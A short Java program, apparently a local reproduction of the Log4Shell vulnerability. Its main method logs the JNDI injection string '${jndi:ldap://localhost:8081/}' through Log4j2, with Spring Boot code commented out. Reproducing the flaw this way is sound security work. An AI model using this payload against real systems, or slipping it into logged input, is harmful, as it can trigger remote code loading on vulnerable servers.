package rhirabay;

//import org.springframework.boot.SpringApplication;
//import org.springframework.boot.autoconfigure.SpringBootApplication;

//import lombok.extern.log4j.Log4j2;

//@SpringBootApplication
//@Log4j2
public class Application {
    public static void main(String[] args) {
//        SpringApplication.run(Application.class);
        org.apache.logging.log4j.Logger log = org.apache.logging.log4j.LogManager.getLogger(Application.class);
        log.info("${jndi:ldap://localhost:8081/}");
    }
}
